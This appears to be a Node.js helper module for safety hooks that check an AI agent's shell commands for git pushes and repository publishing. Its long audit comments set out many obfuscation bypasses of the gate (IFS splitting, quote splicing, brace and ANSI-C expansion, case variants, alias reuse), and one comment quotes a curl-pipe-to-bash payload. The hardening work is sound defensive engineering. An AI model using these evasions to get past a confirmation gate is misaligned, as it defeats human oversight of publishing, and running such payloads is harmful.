// lib.mjs — shared helpers for the GRU953-Studio Bash hooks (scan.mjs, gate.mjs).
// Zero dependencies (Node stdlib only). Both hooks run on every Bash call via
// the same PreToolUse chain in hooks.json, so importing this costs nothing
// extra and keeps the two hooks' shared logic (decisions, tool-call parsing,
// the studio-run marker and the push-capable matcher) defined in exactly one
// place instead of two copies that could quietly drift apart.
//
// Adapted from GRU953-Crew's proven hooks of the same name (2026-07-07
// design) — reused deliberately rather than re-invented, per the lesson
// recorded in this project's own memory that redesigning proven mechanisms
// is a cost, not a feature.

import fs from 'node:fs';
import path from 'node:path';

// ---- decision helpers --------------------------------------------------------
// Output is built with JSON.stringify, never hand-interpolated: a reason
// string can legitimately contain quotes, backslashes or newlines (several of
// this project's own deny reasons do — they quote shell commands), and a
// hand-built JSON string silently produced INVALID JSON for those. An
// unparseable PreToolUse deny risks failing OPEN (the block not being
// honoured). 2026-07-11 v2.0.0 audit fix — caught by hooks.test.mjs.
export function allow() {
  process.stdout.write(
    JSON.stringify({ hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'allow' } }) + '\n'
  );
  process.exit(0);
}
export function deny(reason) {
  process.stdout.write(
    JSON.stringify({
      hookSpecificOutput: {
        hookEventName: 'PreToolUse',
        permissionDecision: 'deny',
        permissionDecisionReason: String(reason),
      },
    }) + '\n'
  );
  process.exit(2);
}

// ---- read the tool call ------------------------------------------------------
export function readStdin() {
  try {
    return fs.readFileSync(0, 'utf8');
  } catch {
    return '';
  }
}
export function extractCommand(input) {
  let obj;
  try {
    obj = JSON.parse(input);
  } catch {
    return '';
  }
  const ti = obj && typeof obj === 'object' && !Array.isArray(obj) ? obj.tool_input : undefined;
  if (ti === null || ti === undefined || typeof ti !== 'object' || Array.isArray(ti)) return '';
  const cmd = ti.command;
  return typeof cmd === 'string' ? cmd : '';
}
export function extractCwd(input) {
  let obj;
  try {
    obj = JSON.parse(input);
  } catch {
    return '';
  }
  const c = obj && typeof obj === 'object' && !Array.isArray(obj) ? obj.cwd : undefined;
  return typeof c === 'string' ? c : '';
}

// ---- studio run marker (the run-scope gate) --------------------------------------
// The studio's project marker is its Dev-Memory folder. Walk up from `start`
// looking for one; return the project root that contains it, or null when no
// studio project exists anywhere up the tree (=> no active studio run here).
export function findStudioRoot(start) {
  let d = path.resolve(start);
  for (;;) {
    try {
      if (fs.statSync(path.join(d, 'Dev-Memory')).isDirectory()) return d;
    } catch {
      // not present at this level; keep walking
    }
    const parent = path.dirname(d);
    if (parent === d) return null;
    d = parent;
  }
}

// ---- push-capable command matcher (fail CLOSED) ------------------------------
// Shared by scan.mjs and gate.mjs, so the phase gate and the secret scan cover
// exactly the same command set: a push-capable command cannot slip past one
// while still being caught by the other. If we cannot POSITIVELY prove the
// command is NON-push, treat it as push.
//
// 2026-07-10 gold-standard audit finding (MAJOR, fixed here): the original
// matcher only pattern-matched literal "push"/"gh" text, so `git -c
// alias.p=push p` (a one-line git alias) defeated it completely — the
// literal substring "push" never appears with the required whitespace
// before it. Also, indirection (a project's own deploy.sh / Makefile /
// `npm run release` that itself runs `git push`) is invoked via a Bash
// command containing neither word. Changes here close the two Round-1
// proof-of-concept bypasses (alias definition, script/Makefile/npm-run
// indirection) plus `git send-pack` and `gh alias set` (Round 2 additions).
//
// Disclosed, NOT fully closed (see SECURITY.md): because each hook call
// judges one command string in isolation with no persistent state, an
// alias DEFINED in an earlier command (or in the user's pre-existing global
// gitconfig, never touched by this plugin at all) can still be REUSED later
// by bare name (`git p`) without the word "push" appearing in that later
// command. Catching that would require a state store or inspecting
// `.git/config` on every command, which this hook design doesn't do.
// 2026-07-11 v2.0.0 follow-up audit fix (MAJOR): an adversarial pass found
// that bash resolves `git${IFS}push` (IFS-based word-splitting) and
// `git pu""sh` / `git pu''sh` (empty-string quote splicing) to a real
// `git push` — but the matcher only ever sees the UN-expanded literal text,
// so both returned false (non-push), skipping the secret scan and the
// publish gate entirely. Neither is a variant of the quote-tolerance fix
// above (that handles a whole token wrapped in quotes, not mid-word
// splicing or a shell variable expanding to whitespace). Fix: canonicalise
// the two concrete techniques found — strip empty adjacent quote pairs, and
// replace `$IFS`/`${IFS}` with a literal space — before running every check
// below. This closes the two proof-of-concept bypasses; it does NOT close
// shell obfuscation in general, which has effectively unlimited variations
// (see SECURITY.md's disclosed-limitations section, extended for this).
// 2026-07-11 Round 2 follow-up: adversarial re-testing found the first pass
// only stripped EMPTY adjacent quote pairs, missing the more general (and
// equally trivial) case of quoting real characters mid-word — `git
// p"u"s"h"` splices to a real `push` in bash the same way `pu""sh` does,
// just with non-empty quoted segments — plus backslash-escaped mid-word
// characters (`p\ush`) and backslash-newline line continuations. Now
// stripped generally: repeatedly remove any quote character touching a
// word character on either side (a fixed-point loop, so cascading splices
// like `p"u"s"h"` fully resolve, not just the first pair), remove
// backslash-newline continuations, and un-escape a backslash before an
// ordinary word character. Still not a full shell parser — command
// substitution and variable-reuse-based obfuscation remain open, disclosed
// limitations (see SECURITY.md).
//
// 2026-07-11 Round 4 adversarial-audit fix: the Round 2 version stripped a
// quote whenever a word character touched EITHER side of it, with no check
// on the OTHER side — so the closing quote of a perfectly normal, properly
// paired quoted argument (`"My Project"`, `"/some/path/confirm-publish.mjs"`)
// also got stripped, because it sits right after a word character (the
// last letter of the argument) even though what follows the quote is
// whitespace or end-of-string, not another word character. That corrupted
// legitimate quoted paths containing a space, which then failed
// isConfirmScriptOnly()'s exact-match regex and fell through to the
// generic script/keyword heuristic below — misclassifying a genuine
// confirm-publish.mjs invocation with a spaced project-root argument as
// push-capable, recreating the bootstrap deadlock for that specific input.
// Fixed by only stripping a quote when word characters (or another quote,
// so chained splices still resolve) sit on BOTH immediate sides — the
// actual signature of mid-word splicing — never when the quote is at a
// genuine token boundary (next to whitespace, start, or end of string).
// 2026-07-11 Round 5 audit fix: exported so gate.mjs's isGoPublicCommand()
// can share the exact same canonicalisation isPushCapable() uses, instead
// of matching raw, unnormalized command text (see that function for what
// this closed).
//
// 2026-07-12 audit fix (CRITICAL, found by execution): every trailing
// boundary below (`([ \t]|$)`, `([ \t]|=|$)`) required the matched keyword
// to be followed by a literal space/tab or the true end of the string. But
// real bash commands are just as often followed by `;`, `|`, `&`, `)`, `<`,
// `>`, a backtick, or a trailing newline — none of which satisfy those
// anchors — so `git push;`, `git push|cat`, `git push\n`, `git send-pack;`,
// and the go-public `--public;` all failed to match and were misclassified
// as non-push, bypassing the secret scan and both confirmation gates
// entirely. Reproduced live end-to-end: with a real secret committed and
// zero confirmation tokens recorded, `git push;` was `allow`ed by both
// scan.mjs and gate.mjs while plain `git push` was correctly denied.
// `LEXICAL_BOUNDARY` is shared by every regex below (and by gate.mjs's
// isGoPublicCommand) that previously ended in one of those two anchors: a
// negative lookahead for an identifier character treats any of ';|&)<>`\n'
// or end-of-string as a valid boundary, while still rejecting a keyword
// that's actually part of a longer word (`pushx`, `--publicity`).
export const LEXICAL_BOUNDARY = '(?![A-Za-z0-9_])';
export function normalizeForPushCheck(c) {
  let n = c;
  // 2026-07-12 Round 3 audit fix (CRITICAL, found by adversarial combination
  // testing, then independently reproduced live before fixing): bash brace
  // expansion turns `{git,push}` into the two separate words `git push`
  // BEFORE the command line is even parsed — confirmed live (`bash -c
  // 'echo {git,push} origin main'` -> `git push origin main`) — but nothing
  // here recognised the `{a,b}` form at all, so `{git,push} origin main`
  // (and stacked with case-variance, a trailing terminator, quote-splicing,
  // or ANSI-C quoting) bypassed every keyword regex below, since none of
  // them ever expected a comma where whitespace should be. This is a
  // distinct technique from every prior fix in this file (IFS-splitting,
  // quote-splicing, backslash-escapes, ANSI-C quoting all target something
  // OTHER than the source text's inter-token separator) and defeated BOTH
  // the push gate and the go-public gate simultaneously with zero
  // confirmation tokens — reproduced end-to-end via the real gate.mjs, and
  // separately confirmed live against this very session's own active hook
  // chain. Runs before the ANSI-C step below (2026-07-12 Round 5 comment
  // fix: this originally said brace expansion "runs first," matching
  // bash's real evaluation order — but the Round 4 variable-substitution
  // step immediately below was inserted ABOVE this line, so the actual
  // code order is now variable-substitution, then brace, then ANSI-C —
  // the reverse of bash's own brace-then-variable order. Re-verified this
  // round that the divergence is safe, not exploitable: every case where
  // the two orders would give a different answer requires brace expansion
  // to synthesise a `$VAR` reference that doesn't appear in the source
  // text at all, which fails CLOSED — misclassified as MORE push-capable,
  // never less — so this comment is corrected for accuracy, not because
  // the order needed to change).
  // 2026-07-12 Round 4 re-verification fix (CRITICAL, found by execution,
  // then a second real bug found while fixing the first): a fresh
  // adversarial pass found that the Round 3 line above excluded any brace
  // group containing a `$`, reasoned as needed "so `${IFS}`-style parameter
  // expansions are left alone" — that reasoning was simply wrong: `${IFS}`
  // contains no comma, so it was never going to match this comma-requiring
  // regex regardless of the `$` exclusion; the exclusion protected against
  // nothing while creating a real gap. First fix attempt: removed the `$`
  // exclusion so the comma-list is split regardless of `$` content — this
  // alone did NOT close the bypass (verified: still failed after that
  // change), because the disguised alternative itself (`gi$t`) still isn't
  // literally "git" once split out; splitting alone doesn't resolve what
  // `$t` means. Real bash's actual PoC — `t=t; {gi$t,push} origin main` —
  // assigns the variable in the SAME command string, then relies on it:
  // confirmed live via real bash (`t=t; set -- {gi$t,push} origin main;
  // echo "$@"` -> `git push origin main`). Second, complete fix: a
  // narrow, bounded variable-substitution step (below) that resolves ONLY
  // a simple `VAR=value` assignment made earlier in the SAME command
  // string, then substitutes later `$VAR`/`${VAR}` references with that
  // literal value — deliberately NOT a general shell-variable interpreter
  // (no export/arrays/command-substitution/quoting-in-value support), the
  // same "closes the concrete case, not shell obfuscation in general"
  // pattern already used throughout this function; a variable whose value
  // isn't resolvable this way (e.g. set in an earlier, separate Bash call,
  // or from the environment) remains a disclosed residual limitation, the
  // same shape as the already-disclosed git-alias-reuse gap in SECURITY.md
  // (this hook has no persistent state across commands). Reproduced
  // end-to-end before fixing: with a real secret committed and zero
  // confirmation tokens, `t=t; {gi$t,push} origin main` was allowed by
  // both `scan.mjs` and `gate.mjs`; the go-public analogue (`h=h;
  // {g$h,repo,edit} me/app --public`) defeated both gates the same way.
  // Also disclosed, not fully closed (re-confirmed this round): nested
  // braces (`{g{i,y}t,push}`) and prefix/suffix concatenation forms
  // (`p{ush,ost}`, `git{,-push}`) are a detection gap but NOT a live
  // working bypass — real bash's own Cartesian-product semantics corrupt
  // the resulting command's actual target/subcommand in both cases (e.g.
  // `git p{ush,ost} origin main` really runs `git push` but with "post"
  // substituted as the destination, so nothing actually reaches `origin`).
  // 2026-07-12 Round 5 re-verification fix (CRITICAL x3 + one implementation
  // bug, found by a final adversarial pass, all independently reproduced
  // live before fixing): the Round 4 variable-substitution step above had
  // four real gaps.
  // (1) The assignment anchor required the variable name to start
  // immediately after `^`/`;`/`\n`/`&&` — a leading `export `/`local `/
  // `readonly `/`declare `/`typeset ` keyword (all fully resolvable in the
  // SAME command, unlike the alias-reuse/array/command-substitution cases
  // this step already disclosed as inherently unclosable) sat in between
  // and was never captured, so `export t=t; {gi$t,push}` left `$t`
  // unresolved. Fixed by tolerating an optional declaration keyword.
  // (2) Assignment VALUES were captured once from the untouched original
  // string, so a transitive chain (`a=i; b=$a; {g${b}t,push}`) captured
  // `b`'s value as the literal, unresolved text `$a`, not `a`'s actual
  // value `i`. Fixed by resolving each new assignment's value against
  // already-processed assignments (in left-to-right order, matching how
  // bash itself would resolve a sequential chain) before recording it.
  // (3) The substitution itself was `n.replace(varRe, value)` — passing an
  // attacker-influenced VALUE as a plain string to JS's `String.replace()`
  // is unsafe, because JS treats `$$`, `$&`, `` $` ``, `$'`, and `$1`-`$9`
  // in a STRING replacement argument as special back-reference tokens, not
  // literal text. A value containing any of these (trivially producible in
  // real bash, e.g. `t=$'push'`) corrupted the normalized string in
  // unpredictable ways instead of substituting literally. This is a JS-
  // mechanics defect, not a missing shell-obfuscation case — fixed by using
  // a function replacer (`() => value`), which always substitutes literally
  // regardless of what characters `value` contains.
  // (4) Bash's `{X..Y}` sequence/range syntax (distinct from the comma-list
  // form already handled) has no comma, so the brace-expansion regex below
  // never touched it — but bash also accepts a DEGENERATE single-element
  // range where both ends are identical (`{s..s}` -> just `s`), letting a
  // single character hide behind range syntax purely to dodge the comma
  // requirement: confirmed live, `git pu{s..s}h origin main` -> real bash
  // `git push origin main`. Fixed by expanding only this narrow, safe
  // degenerate case (`{X..X}` -> `X`) — NOT general range expansion
  // (`{a..z}`, `{1..100}`), which would be materially more engineering
  // effort and a DoS risk for large numeric ranges, well beyond "closes the
  // concrete case." All four reproduced end-to-end via the real
  // gate.mjs/scan.mjs with a real secret and zero confirmation tokens on
  // both the push and go-public paths before being fixed here.
  // 2026-07-12 audit fix (CRITICAL, live bypass, found by a final adversarial
  // combination pass that specifically re-attacked this same step): a
  // declaration-keyword statement (`export`/`declare`/`readonly`/`typeset`)
  // is itself a real command invocation, so its ARGUMENTS undergo bash's
  // normal command-line expansion — including brace expansion — BEFORE the
  // keyword ever sees them. `export v={private,public}` therefore does not
  // assign the literal text `{private,public}`; bash expands it first into
  // TWO arguments, `v=private v=public`, and `export` (like `declare`/
  // `readonly`/`typeset`) applies them left-to-right with the LAST one
  // winning — confirmed live (`bash -x` shows `+ export v=private v=public`,
  // then `+ v=private` then `+ v=public`). The code below used to capture
  // the raw, un-expanded `{private,public}` text as the value and defer
  // expansion to the generic brace-expansion pass further down, which just
  // space-joins the list in place instead of modelling last-write-wins —
  // producing `--visibility=private public` instead of `--visibility=public`,
  // which no longer matches `isGoPublicCommand`'s regex (it requires
  // `public`/`internal` immediately after `=`). Reproduced end-to-end via
  // the real gate.mjs: with only the PRIVATE-publish token recorded (no
  // go-public token), `export v={private,public}; gh repo edit me/app
  // --visibility=$v` was ALLOWED — a live bypass of the private-then-public
  // separation. The bare, no-keyword form (`v={private,public}; ...`) is
  // NOT exploitable and is deliberately left untouched here: a plain
  // assignment word is not itself brace-expanded by bash, so `$v` really
  // does hold the literal, un-expanded text `{private,public}` there, which
  // the existing generic brace-expansion pass below correctly reproduces —
  // confirmed live before scoping this fix to keyword-prefixed assignments
  // only, rather than applying it universally and risking a DIFFERENT
  // divergence from bash's actual (keyword-dependent) behaviour.
  function resolveEmbeddedBraceList(raw) {
    let v = raw.replace(/\{([A-Za-z0-9]+)\.\.\1\}/g, '$1'); // degenerate {X..X} -> X
    const m = v.match(/\{([^{}]*,[^{}]*)\}/);
    if (m) {
      const parts = m[1].split(',');
      v = v.slice(0, m.index) + parts[parts.length - 1] + v.slice(m.index + m[0].length);
    }
    return v;
  }
  const varAssignRe = /(?:^|[;\n]|&&)\s*(export|local|readonly|declare|typeset)?\s*([A-Za-z_][A-Za-z0-9_]*)=(?:"([^"]*)"|'([^']*)'|([^\s;&|]*))/g;
  const known = new Map();
  for (const am of n.matchAll(varAssignRe)) {
    const hadKeyword = Boolean(am[1]);
    const varName = am[2];
    let value = am[3] ?? am[4] ?? am[5] ?? '';
    if (hadKeyword) value = resolveEmbeddedBraceList(value);
    for (const [kName, kValue] of known) {
      const kRe = new RegExp('\\$\\{' + kName + '\\}|\\$' + kName + '\\b', 'g');
      value = value.replace(kRe, () => kValue);
    }
    known.set(varName, value);
  }
  for (const [varName, value] of known) {
    const varRe = new RegExp('\\$\\{' + varName + '\\}|\\$' + varName + '\\b', 'g');
    n = n.replace(varRe, () => value);
  }
  n = n.replace(/\{([A-Za-z0-9]+)\.\.\1\}/g, '$1'); // degenerate {X..X} range -> X
  n = n.replace(/\{([^{}]*,[^{}]*)\}/g, (_m, list) => list.split(',').join(' '));
  // 2026-07-11 Round 7 security fix: ANSI-C quoting (`$'public'`) resolves
  // to the literal text `public` in bash, but nothing here recognised the
  // `$'...'` form at all, so `gh repo edit me/app --visibility $'public'`
  // (and the `=$'public'` / mid-word `--pub$'lic'` variants) sailed through
  // both isPushCapable's own gh-detection and isGoPublicCommand with only
  // the private-publish token recorded — reproduced live via bash itself
  // (`x=$'public'; echo "$x"` -> `public`) before fixing. Stripped to its
  // raw inner text before the generic backslash-unescape pass and IFS/
  // quote-splice steps that follow (2026-07-12 Round 5 comment fix: this
  // said "FIRST, before any other step" — no longer accurate now that the
  // Round 4 variable-substitution step and the brace-expansion step both
  // run earlier; the ordering THIS comment actually cares about — before
  // the generic backslash pass, so an escaped quote inside the ANSI-C
  // string isn't resolved too early — still holds), using an escape-aware
  // match (`\\.` consumes an escaped char, including an escaped quote,
  // without treating it as the closing quote) so the wrapper's true end is
  // found correctly even if the content contains `\'`. This runs before the
  // generic backslash-unescape pass below on purpose: that pass would
  // otherwise resolve an escaped quote inside the ANSI-C string too early
  // and corrupt where this wrapper actually ends.
  // 2026-07-11 Round 8 security fix: the wrapper-strip above passed the
  // ANSI-C content through UNCHANGED, but bash also decodes `\xHH` (hex)
  // and `\NNN` (octal) escapes inside `$'...'` — so `$'pub\x6cic'` and
  // `$'pub\154ic'` both resolve to the literal text `public` in bash (the
  // hex/octal escapes spell the letter `l`), and `$'\x67\x68'` resolves to
  // `gh`, letter-by-letter spelling the binary name itself. The old code
  // left `\x6c`/`\154` as literal backslash-digit text, which the generic
  // backslash-unescape pass below then mangled into garbage (`x6c`, `154`)
  // instead of the real decoded character — so neither the keyword nor the
  // binary-name regexes ever saw `public`/`gh`, an unconditional bypass.
  // Decoded BEFORE stripping the wrapper (any other backslash escape inside
  // the string, e.g. `\'`, is left for the generic pass right after).
  n = n.replace(/\$'((?:\\.|[^'\\])*)'/g, (_m, inner) => {
    const decoded = inner
      .replace(/\\x([0-9A-Fa-f]{1,2})/g, (_h, hex) => String.fromCharCode(parseInt(hex, 16)))
      .replace(/\\([0-7]{1,3})/g, (_o, oct) => String.fromCharCode(parseInt(oct, 8)));
    return decoded;
  }); // $'public' -> public, $'pub\x6cic' -> public, $'\x67\x68' -> gh
  n = n.replace(/\\\r?\n/g, ''); // backslash-newline line continuation
  // Un-escape a backslash before ANY other (non-newline) character: in bash,
  // outside quotes, `\X` is just a literal `X`, whatever X is. 2026-07-11
  // Round 6 security fix — the earlier `[A-Za-z0-9]`-only version left
  // escaped PUNCTUATION intact, so `gh repo edit me/app -\-public`,
  // `\-\-public`, and `--visibility\=public` kept their backslashes and the
  // go-public regexes missed them, while bash ran a real `--public` /
  // `--visibility=public` — an obfuscated going-public bypass that passed
  // with only the private-publish token. Now `\X` -> `X` for any X.
  n = n.replace(/\\([^\r\n])/g, '$1'); // p\ush -> push, -\-public -> --public
  n = n.replace(/\$\{IFS\}|\$IFS\b/g, ' '); // git${IFS}push -> git push
  let prev;
  do {
    prev = n;
    // strip a quote char only when word/quote characters sit on BOTH
    // immediate sides (the mid-word-splice signature), one layer per pass;
    // loop to a fixed point so chained splices like p"u"s"h" fully
    // resolve. A quote at a real token boundary (next to whitespace, the
    // start, or the end of the string) is left alone.
    n = n
      .replace(/([A-Za-z0-9_"'-])(["'])(?=[A-Za-z0-9_"'-])/g, '$1')
      .replace(/(?<=[A-Za-z0-9_"'-])(["'])([A-Za-z0-9_-])/g, '$2');
  } while (n !== prev);
  return n;
}
// 2026-07-11 v2.0.1 follow-up fix (real deadlock, found live): the
// "script name contains deploy/release/publish/ship" indirection rule
// below correctly treats an arbitrary project script that might hide a
// push as push-capable — but `confirm-publish.mjs` and
// `confirm-go-public.mjs` themselves match it purely because their OWN
// filenames contain "publish"/"go-public", even though neither script
// pushes anything; each only writes a local marker file recording that
// the user already confirmed. That made gate.mjs deny the very script
// that RECORDS a confirmation on the grounds that "no confirmation is
// recorded yet" — a bootstrap deadlock with no way out, since the record
// can never be written.
//
// The exemption below is deliberately narrow — it strips at most one simple
// leading `cd ... &&`/`cd ...;` prefix, then requires NO compound operator
// anywhere in what remains (so nothing can be chained before or after), and
// only THEN checks that what's left is a plain `node <path-to-one-of-the-
// two-scripts> [one optional argument]` invocation. This is NOT a bare
// substring check: `git push origin main; node confirm-publish.mjs` still
// has a `;` left after stripping (there's no leading cd to strip, so the
// whole string is scanned for compound operators and the `;` is found) and
// is correctly NOT exempted — still caught by the checks below as a real
// push.
//
// 2026-07-11 Round 3 adversarial-audit fix (CRITICAL, found by independent
// verification, not trusted from the first report): the original version of
// this function matched the path with `\S.*(confirm-publish|confirm-go-
// public)\.mjs`, which is a SUFFIX/substring test, not an identity check —
// `node ./evil-confirm-publish.mjs` and `node /tmp/attacker/z-confirm-
// publish.mjs` both matched, because the literal text "confirm-publish.mjs"
// merely appears at the end of a longer, unrelated filename. Since
// isPushCapable() returning false makes BOTH gate.mjs and scan.mjs allow()
// immediately — skipping the secret scan and the publish-confirmation check
// entirely — this let any node script with a crafted filename run completely
// unchecked. The same over-broad match also had a second bug: a BARE
// invocation with no directory prefix at all (`node confirm-publish.mjs`,
// which is exactly the usage documented in that script's own header
// comment) failed the old regex, because `\S.*` required at least one
// character to exist strictly BEFORE the matched filename text — recreating,
// for that literal invocation form, the exact bootstrap deadlock this
// function was written to fix.
//
// Fixed by extracting the actual path argument and comparing its real
// `path.basename()` for an EXACT match against the two known script names,
// rather than testing whether the filename merely ends with that text. This
// closes both bugs: a bare `confirm-publish.mjs` has basename
// `confirm-publish.mjs` (exact match, exempted); `evil-confirm-publish.mjs`
// has basename `evil-confirm-publish.mjs` (not an exact match, NOT
// exempted, falls through to the ordinary push-capable checks below).
//
// Disclosed, not eliminated: this still trusts a FILENAME, not a
// cryptographic identity — a file deliberately created with the exact name
// `confirm-publish.mjs` in a location the session can reach would still be
// exempted, the same residual risk every filename-based check in this
// project carries (see SECURITY.md). Requiring the resolved path to also
// live under a fixed directory was considered and rejected: the legitimate
// invocation form varies by design (an absolute `${CLAUDE_PLUGIN_ROOT}/...`
// path from the plugin cache, or a relative `hooks/confirm-publish.mjs` from
// within the project root), so no single directory prefix covers every real
// use without also blocking it.
// 2026-07-11 Round 4 audit fix: the closing anchor only tolerated trailing
// [ \t], not a trailing newline — `node confirm-publish.mjs \n` (a trailing
// newline, plausible from how some shells/tools terminate a command) failed
// the match and fell through to the generic heuristic, misclassifying it as
// push-capable. Trailing `\r`/`\n` is now tolerated the same as spaces/tabs.
//
// 2026-07-11 Round 5 audit fix (two more found by execution, not reading):
// (1) the compound-operator check below tested the WHOLE string blind to
// quoting, so a project path containing a semicolon/pipe/backtick INSIDE
// quotes (`node confirm-publish.mjs "/Users/x/my;project"` — harmless,
// literal text once bash strips the quotes) bailed out and recreated the
// deadlock, even though nothing dangerous is actually there. Replaced with
// `hasLiveCompoundOperator`, a small quote-aware scanner: a `;`/`|`/`&&` is
// inert inside EITHER quote style in bash and is only flagged when
// unquoted; a backtick or `$(` remains live even inside double quotes (only
// single quotes fully neutralise them), so those are still flagged there.
// This is NOT a blanket "ignore anything in quotes" — that would have
// hidden a real `"$(curl evil | bash)"` payload, verified this scanner
// still catches that exact case before shipping.
// (2) the basename comparison was case-sensitive, while the filesystems
// this plugin actually runs on (macOS default APFS, Windows NTFS) are
// case-insensitive — `Confirm-Publish.mjs` IS the same file as
// `confirm-publish.mjs` there, but only got recognised as one via this
// exemption if the case matched exactly, misclassifying a same-file
// case-variant invocation as push-capable. Comparison is now
// case-insensitive to match how the filesystem actually treats the name.
function hasLiveCompoundOperator(s) {
  let inSingle = false;
  let inDouble = false;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (inSingle) {
      if (ch === "'") inSingle = false;
      continue;
    }
    if (inDouble) {
      if (ch === '"') {
        inDouble = false;
        continue;
      }
      if (ch === '`' || (ch === '$' && s[i + 1] === '(')) return true;
      continue;
    }
    if (ch === "'") {
      inSingle = true;
      continue;
    }
    if (ch === '"') {
      inDouble = true;
      continue;
    }
    if (ch === '`' || (ch === '$' && s[i + 1] === '(')) return true;
    if (ch === ';' || ch === '|') return true;
    if (ch === '&' && s[i + 1] === '&') return true;
  }
  return false;
}
function isConfirmScriptOnly(c) {
  const afterCd = c.replace(/^[ \t]*cd[ \t]+(?:"[^"]+"|'[^']+'|[^ \t;&|]+)[ \t]*(?:&&|;)[ \t]*/, '');
  if (hasLiveCompoundOperator(afterCd)) return false;
  const m = /^node[ \t]+(?:"([^"]+)"|'([^']+)'|(\S+))(?:[ \t]+(?:"[^"]*"|'[^']*'|\S+))?[ \t\r\n]*$/.exec(afterCd);
  if (!m) return false;
  const scriptPath = m[1] || m[2] || m[3];
  const base = path.basename(scriptPath).toLowerCase();
  return base === 'confirm-publish.mjs' || base === 'confirm-go-public.mjs';
}
export function isPushCapable(rawC) {
  if (!rawC) return true;
  const c = normalizeForPushCheck(rawC);
  if (isConfirmScriptOnly(c)) return false;
  // 2026-07-11 Round-A adversarial-audit fix: tolerate quotes around the
  // git binary or the `push` subcommand. `git "push"`, `git 'push'` and
  // `"git" push` all run a real push once the shell strips the quotes, but
  // the un-quoted matcher rated them NON-push — a fail-OPEN bypass that
  // contradicted this matcher's own "prove non-push or treat as push" rule.
  // Optional `['"]?` around `git` and `push` closes it; a battery in
  // hooks.test.mjs locks it in, and the safe-command set was re-verified to
  // confirm no new false positives (gitk/github/xgit/`git pushx` stay clear).
  //
  // 2026-07-11 Round 8 audit fix (CRITICAL, the most severe bypass found in
  // this whole loop): every regex in this function matched `git`/`gh`/
  // `push`/`repo`/etc. as literal, case-SENSITIVE text. But on the
  // case-insensitive filesystems this plugin actually targets (macOS APFS,
  // Windows NTFS — already the reason the confirm-script basename check
  // above is case-insensitive), `PATH` lookup for a binary name is ALSO
  // case-insensitive: `GIT push origin main` and `GH repo edit me/app
  // --visibility public` are not obfuscation, bash runs them as the REAL
  // git/gh binaries, completely unchanged, because `GIT`/`GH` resolve to
  // the same executable as `git`/`gh`. Reproduced live: `bash -c 'GIT
  // --version'` prints the real git version; `isPushCapable('GIT push
  // origin main')` returned `false` (should be `true`); with a real AWS-
  // shaped secret committed and ZERO confirmation tokens recorded,
  // `GIT push origin main` was `allow`ed by both `scan.mjs` and `gate.mjs`
  // while lowercase `git push origin main` was correctly denied — proving
  // it was the casing, not a broken test. Added `/i` to every regex in this
  // function and in `isGoPublicCommand` (gate.mjs) that matches a binary
  // name, subcommand, or keyword — matching the same `/i` this project
  // already added to the script-extension check and the confirm-script
  // basename comparison, for the identical reason.
  if (new RegExp(`(^|[^A-Za-z0-9_])['"]?git['"]?([ \\t]+-[^ \\t]+|[ \\t]+[^ \\t]+)*[ \\t]+['"]?push['"]?${LEXICAL_BOUNDARY}`, 'i').test(c)) return true;
  // 2026-07-11 Round 5 audit fix (CRITICAL, found live via gate.mjs's real
  // isGoPublicCommand()): every `gh ...` regex below required the literal,
  // unquoted text "gh" — `"gh" repo edit ...` or `gh "repo" "edit" ...`
  // wasn't just missed by isGoPublicCommand's own (now-fixed) matcher, it
  // was missed by isPushCapable ITSELF, so the command never even reached
  // isGoPublicCommand — gate.mjs's first check (`if (!isPushCapable(CMD))
  // allow()`) exited early and let a quoted-token `gh repo edit --visibility
  // public` straight through with no confirmation of any kind. The git-push
  // regex above already tolerated quotes around `git`/`push` (Round A); the
  // gh regexes never got the same treatment. Added `['"]?` around every gh
  // token and sub-token.
  if (/(^|[^A-Za-z0-9_])['"]?gh['"]?[ \t]+(['"]?repo['"]?[ \t]+['"]?(create|edit|sync|clone)['"]?|['"]?pr['"]?[ \t]+['"]?create['"]?|['"]?release['"]?[ \t]+['"]?(create|upload)['"]?|['"]?gist['"]?[ \t]+['"]?create['"]?)/i.test(c)) return true;
  if (new RegExp(`(^|[^A-Za-z0-9_])['"]?gh['"]?[ \\t].*--push['"]?${LEXICAL_BOUNDARY}`, 'i').test(c)) return true;
  // git aliases that resolve to push (e.g. `git -c alias.p=push p`, or
  // `git config alias.foo push` followed later by `git foo`).
  if (/(^|[^A-Za-z0-9_])git[ \t]+(-c[ \t]+)?alias\.[A-Za-z0-9_.-]+[ \t]*=[ \t]*['"]?push/i.test(c)) return true;
  if (/(^|[^A-Za-z0-9_])git[ \t]+config([ \t]+--\S+)*[ \t]+alias\.[A-Za-z0-9_.-]+[ \t]+['"]?push/i.test(c)) return true;
  // git plumbing command that performs a push without the word "push".
  if (new RegExp(`(^|[^A-Za-z0-9_])git[ \\t]+send-pack${LEXICAL_BOUNDARY}`, 'i').test(c)) return true;
  // gh's own alias mechanism, same shape of risk as git aliases.
  if (/(^|[^A-Za-z0-9_])['"]?gh['"]?[ \t]+alias[ \t]+set/i.test(c)) return true;
  // 2026-07-11 fix (found live, in real use, not just review): there used
  // to be a blanket fallback here — "if the command has any compound
  // operator (&&, ;, |, etc.) AND contains the bare substring 'gh', treat
  // it as push-capable." It was meant to catch obfuscated pushes hidden
  // behind chaining, but every regex above is UNANCHORED, so `.test()`
  // already finds a real `git push`/`gh repo create`/etc. anywhere in the
  // string, compound or not — the fallback added no real detection power.
  // What it DID do: block nearly every ordinary `cd <dir> && gh <anything>`
  // command — including harmless reads like `gh repo view`/`gh auth
  // status`/`gh api user` — because this environment's Bash tool doesn't
  // reliably persist a working directory, so "cd X && gh Y" is the normal
  // way to run almost any gh command here. Removed: it failed at stopping
  // real obfuscation (the `$(...)`-construction bypass below defeats it
  // just the same as everything else) while blocking completely ordinary,
  // safe usage. Indirection: running a script file, a Makefile target, or a
  // package-manager task can contain a push with no "push"/"gh" text in
  // THIS command. Fail closed rather than assume it's safe.
  //
  // 2026-07-11 Round 4 audit fix: this keyword list only covered the
  // PRIVATE-publish action (deploy/release/publish/ship). This project also
  // has a separately-gated GOING-PUBLIC action (see isGoPublicCommand /
  // GO-PUBLIC-APPROVED above) with its own, differently-worded vocabulary —
  // a script named e.g. `make-repo-public.mjs` or `visibility-change.mjs`
  // contained none of the four original keywords, so it fell through this
  // heuristic entirely and got an unconditional pass, unlike an
  // equivalently-indirect `publish-app.mjs`. Added `public`/`visibility` so
  // both gated actions get the same fail-closed treatment.
